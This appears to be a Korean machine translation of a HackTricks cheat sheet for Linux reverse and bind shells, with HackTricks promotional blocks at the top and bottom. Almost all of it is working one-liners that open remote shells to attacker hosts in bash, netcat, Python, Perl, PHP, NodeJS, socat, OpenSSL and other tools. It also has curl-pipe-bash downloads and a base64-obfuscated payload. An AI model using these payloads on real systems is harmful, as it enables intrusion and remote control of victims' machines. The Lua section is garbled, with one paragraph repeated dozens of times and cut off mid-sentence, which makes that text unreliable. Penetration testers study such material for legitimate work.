# 쉘 - 리눅스

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로부터 영웅이 될 때까지 AWS 해킹을 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF로 HackTricks를 다운로드하길 원한다면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **해킹 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출하세요.**

</details>

**이러한 쉘 중 어떤 것에 대한 질문이 있다면** [**https://explainshell.com/**](https://explainshell.com) **에서 확인할 수 있습니다.**

## 전체 TTY

**리버스 쉘을 획득한 후**[ **이 페이지를 읽어 전체 TTY를 얻으세요**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
### 심볼 안전 쉘

다른 쉘들(sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, 그리고 bash)도 확인하는 것을 잊지 마세요.
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### 쉘 설명

1. **`bash -i`**: 이 명령어 부분은 대화형(`-i`) Bash 쉘을 시작합니다.
2. **`>&`**: 이 명령어 부분은 **표준 출력(`stdout`)과 표준 에러(`stderr`)를 동일한 대상으로 리다이렉팅**하는 약식 표기법입니다.
3. **`/dev/tcp/<공격자-IP>/<포트>`**: 이는 지정된 IP 주소와 포트로의 TCP 연결을 나타내는 특수 파일입니다.
* **출력 및 에러 스트림을 이 파일로 리다이렉팅**함으로써, 해당 명령어는 대화형 쉘 세션의 출력을 공격자의 기기로 전송합니다.
4. **`0>&1`**: 이 명령어 부분은 **표준 입력(`stdin`)을 표준 출력(`stdout`)과 동일한 대상으로 리다이렉팅**합니다.

### 파일 생성 및 실행
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## 전방 쉘

만약 Linux 기반 웹 애플리케이션에서 **RCE 취약점**을 만나게 되면, Iptables 규칙이나 다른 필터의 존재로 인해 **역쉘 획득이 어려워질 수 있는** 경우가 있습니다. 이러한 시나리오에서는 파이프를 사용하여 침해된 시스템 내에서 PTY 쉘을 생성하는 것을 고려해보세요.

코드는 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)에서 찾을 수 있습니다.

다음을 수정하면 됩니다:

* 취약한 호스트의 URL
* 페이로드의 접두사 및 접미사 (있는 경우)
* 페이로드가 전송되는 방식 (헤더? 데이터? 추가 정보?)

그런 다음, **명령을 보내거나** 심지어 **`upgrade` 명령을 사용하여** 완전한 PTY를 얻을 수 있습니다 (파이프는 약 1.3초의 지연으로 읽고 쓰입니다).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)에서 확인하세요.
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet은 네트워크를 통해 다른 컴퓨터에 로그인하고 명령을 실행하는 데 사용되는 프로토콜입니다. Telnet을 사용하면 원격 시스템에 액세스하여 파일을 전송하거나 관리 작업을 수행할 수 있습니다. Telnet은 보안상의 이유로 SSH로 대체되는 것이 권장됩니다.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**공격자**
```bash
while true; do nc -l <port>; done
```
**피해자**

명령을 보내려면 적어두고 Enter를 누르고 CTRL+D를 누르세요 (STDIN을 중지하려면)
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## 파이썬
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## 루비
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

## PHP
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## 자바
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
## Golang

## 고랭 (Golang)
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua는 브라질에서 개발된 경량 스크립팅 언어입니다. C로 작성된 Lua는 임베디드 시스템 및 게임 개발에 널리 사용됩니다. Lua는 간결하고 빠르며 확장 가능한 특징을 가지고 있습니다. Lua는 스크립트 언어로 사용되며 C 코드에 쉽게 통합될 수 있습니다. Lua는 다양한 플랫폼에서 실행될 수 있으며 다양한 운영 체제에서 지원됩니다. Lua는 사용자 정의 데이터 타입 및 메타테이블을 지원하여 동적인 프로그래밍을 할 수 있습니다. Lua는 강력한 문자열 처리 기능을 제공하며 테이블을 사용하여 데이터를 구조화할 수 있습니다. Lua는 또한 함수형 프로그래밍을 지원하며 익명 함수 및 클로저를 사용할 수 있습니다. Lua는 다른 언어와의 통합을 쉽게 할 수 있도록 C API를 제공합니다. Lua는 빠르고 가볍기 때문에 다양한 응용 프로그램에서 스크립팅 언어로 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

## 노드JS
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

공격자 (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
피해자
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### 바인드 쉘
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### 리버스 쉘
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**공격자**
```bash
while true; do nc -l 79; done
```
**피해자**

명령을 보내려면 적어두고 Enter를 누르고 CTRL+D를 누르세요 (STDIN을 중지하려면)
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

## Gawk
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

이 명령은 포트 6001에서 시스템에 연결을 시도합니다:
```bash
xterm -display 10.0.0.1:1
```
역쉘을 잡기 위해 (포트 6001에서 수신 대기할 것입니다):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 참고: Java 역쉘도 Groovy에서 작동합니다.
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## 참고 자료

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

<details>

<summary><strong>제로부터 AWS 해킹을 전문가로 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>와 함께!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)이나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 요령을 공유하세요.**

</details>
